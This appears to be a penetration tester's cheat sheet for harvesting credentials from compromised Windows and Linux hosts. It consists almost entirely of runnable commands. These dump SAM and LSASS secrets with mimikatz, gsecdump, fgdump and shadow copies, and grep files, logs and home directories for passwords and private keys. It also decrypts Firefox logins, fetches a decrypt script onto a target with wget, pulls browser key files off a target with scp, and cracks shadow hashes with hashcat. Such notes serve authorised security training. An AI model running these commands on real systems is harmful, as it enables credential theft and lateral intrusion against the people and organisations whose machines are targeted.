### Password Reuse

REMEMBER TO REUSE DISCOVERED PASSWORDS!!!!!!!! 

Also, if a password is long and looks like a hash, it probably is

Don't miss the easy exploitation routes!

## Windows Password Hunting

### Dump From Apps

Use Lazagne.exe:  https://github.com/AlessandroZ/LaZagne

```bash
lazagne.exe all
```

### Windows Hashes

Don't pass up the hashes for computer/machine accounts, as they can be used the same way user accounts are, depending on their group memberships.

#### Dumping from Registry

```powershell
##### From registry
##### Requires Admin
reg.exe save HKLM\SAM samoutfile
reg.exe save HKLM\SYSTEM sysoutfile
```

#### Dump from Shadow Copies

```powershell
##### From Shadow Copies
cscript vssown.vbs /list

# Check Volume Shadow Service (VSS) status
cscript vssown.vbs /status
cscript vssown.vbs /mode

# Create a new shadow copy
cscript vssown.vbs /create
# Verify it was created
cscript vssown.vbs /list
# For cleanup, note the Device object value and ID

# Copy the SAM and SYSTEM files from the shadow copy.  Note:  Reference the files by prepending the SAM/SYSTEM path with the Device Object Path, as shown below:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp

# For cleanup, delete the newly created copy
cscript vssown.vbs /delete {YOURCOPYID}

# If the service was stopped originally, stop with this:
cscript vssown.vbs /stop
```

#### Dumping with Mimikatz (requires admin)

Note:  the 2.2.0 version of mimikatz x64 that came with Kali on this machine may throw the error `ERROR kuhl_m_sekurlsa_acquireLSA ; Key import`.  It seems as if the newer versions of mimikatz produce this error on Windows 10 ver 1803-1809 but mimikatz 2.1.1 works fine.  Version 2.1.1 can be found here:  https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip

```powershell
# Start the mimikatz interpreter in an ADMIN prompt
mimikatz.exe
# enable SeDebugPrivilge
privilege::debug
# Elevate security token to SYSTEM
token::elevate
# Dump SAM database
lsadump::sam
# Dump cached domain creds
lsadump::cache
# Dumps cached logon creds
sekurlsa::logonpasswords
```

#### Dumping from Meterpreter

```bash
# This dumps the hashes from the SAM file after decrypting it from the registry
# Great way to get all local accounts
run post/windows/gather/smart_hashdump
```

#### gsecdump (probably requires admin)

This tool (allegedly) works on 32bit and 64bit Windows across all versions of Windows (it had issues when I tried it on Win2019x64).   This tool injects a DLL into the LSASS process to grab hashes from memory.  This is dangerous to do in a production environment and can cause a kernel panic (BSoD).   Registry and Shadow Copies are safer for production environments.  I had success running this on Windows XP in a non-interactive shell:

```powershell
# Dump all secrets
gsecdump -a

# Dump hashes from SAM/AD
# This should give you the LM hash, it did on WinXP
# Note:  The LM hash was the second hash field in the output
geecdump -s
```

I found this at  https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/

#### fgdump

This is another option to dump hashes.  It will dump the creds to a file in the same directory in a file called `YOURIP.pwdump`

It is located in /usr/share/windows-binaries/fgdump and is also available at  https://download.openwall.net/pub/projects/john/contrib/win32/pwdump/

```powershell
# Outputs a file with the results
fgdump
```

#### SessionGopher

Grabs passwords commonly found in certain applications, but doesn't appear to have been updated in a while.

https://github.com/Arvanaghi/SessionGopher

## Linux Password Hunting

### From Files

Search within files for strings

#### Config Files

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

#### Databases

```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

#### Text Files

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

#### Scripts

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

#### Crontab

```bash
cat /etc/crontab 
ls -la /etc/cron.*/
```

#### Bash History

```bash
tail -n5 /home/*/.bash*
```

#### Log Files

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Public/Private Keys

Find private keys to use for key-based authentication

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

### From Memory/Cache

#### Mimipenguin

https://github.com/huntergregal/mimipenguin

Requires root/admin

```bash
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh 
```

#### LaZagne

https://github.com/AlessandroZ/LaZagne/tree/master/Linux

```bash
sudo python2.7 laZagne.py all
```

### From Browsers

```bash
ls -l .mozilla/firefox/ | grep default 
# Take the folder(s) you find there and insert it into the command below
cat .mozilla/firefox/[LOOK THIS UP].default-release/logins.json | jq .
```

#### Decrypt from Firefox on Target

Get https://github.com/unode/firefox_decrypt

```bash
wget https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py
python3.9 firefox_decrypt.py
```

#### Decrypt from Firefox files

If not able to run above script on target.  Uses this tool: https://github.com/lclevy/firepwd

1. Download files: key4.db (or key3.db), logins.json (or signons.sqlite)
   ```bash
   scp user@192.168.153.44:/home/user/.mozilla/firefox/ytb95ytb.default-release/key4.db ./
   scp user@192.168.153.44:/home/user/.mozilla/firefox/ytb95ytb.default-release/logins.json ./
   ```

2. Get script
   ```bash
   git clone https://github.com/lclevy/firepwd.git
   pip install -r requirements.txt
   ```
   
3. Run locally ( point to folder with files above)

   ```bash
   python firepwd.py -d ../ffoxfiles
   ```


### Passwd/Shadow Files

1. Copy passwd and shadow files to Kali

   ```bash
   scp -r will@10.129.5.60:/home/will/.backups ./
   cd .backups
   ```

2. Unshadow the file and filter the file down to just the root user (saves some time)

   ```bash
   unshadow passwd.bak shadow.bak > unshadow
   grep root unshadow > root.unshadow
   ```

3. Crack unshadowed file

   ```bash
   hashcat -m 1800 -a 0 root.unshadow /usr/share/wordlists/rockyou.txt -o unshadow.cracked
   
   # -m is SHA-512, other modes are listed in `man hashcat` and search for `Hash types`
   ```

### MD5 Hashes

Crack these with:

```bash
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

